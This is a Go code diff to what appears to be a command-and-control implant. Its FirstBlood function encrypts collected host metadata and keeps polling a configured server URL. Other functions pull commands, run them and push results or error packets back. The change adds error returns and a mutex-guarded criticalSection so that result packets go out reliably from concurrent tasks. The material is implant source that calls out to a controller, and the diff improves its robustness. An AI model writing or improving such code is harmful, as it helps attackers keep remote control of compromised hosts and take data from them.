@@ -11,6 +11,7 @@ import (
 	"main/util"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -227,9 +228,16 @@ func MakeMetaInfo() []byte {
 	return packetToEncrypt
 }
 
-func FirstBlood() bool {
-	encryptedMetaInfo, _ = EncryptedMetaInfo()
-	encryptedMetaInfo, _ = crypt.EncryptMultipleTypes(encryptedMetaInfo, config.Http_get_metadata_crypt)
+func FirstBlood() error {
+	var err error
+	encryptedMetaInfo, err = EncryptedMetaInfo()
+	if err != nil {
+		return err
+	}
+	encryptedMetaInfo, err = crypt.EncryptMultipleTypes(encryptedMetaInfo, config.Http_get_metadata_crypt)
+	if err != nil {
+		return err
+	}
 	for {
 		data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_metadata_crypt)
 		if err == nil {
@@ -241,7 +249,7 @@ func FirstBlood() bool {
 		time.Sleep(500 * time.Millisecond)
 	}
 	time.Sleep(config.WaitTime)
-	return true
+	return err
 }
 
 func PullCommand() ([]byte, error) {
@@ -273,8 +281,7 @@ func DataProcess(callbackType int, b []byte) {
 			ErrorProcess(err)
 		}
 	}
-	finalPaket := MakePacket(callbackType, result)
-	_, err = PushResult(finalPaket)
+	_, err = criticalSection(callbackType, result)
 	if err != nil {
 		ErrorProcess(err)
 	}
@@ -286,8 +293,17 @@ func ErrorProcess(err error) {
 	arg2Bytes := WriteInt(0)
 	errMsgBytes := []byte(err.Error())
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
+	criticalSection(31, result)
+}
+
+var mutex sync.Mutex
+
+func criticalSection(callbackType int, b []byte) ([]byte, error) {
+	mutex.Lock()
+	finalPaket := MakePacket(callbackType, b)
+	result, err := PushResult(finalPaket)
+	mutex.Unlock()
+	return result, err
 }
 
 /*
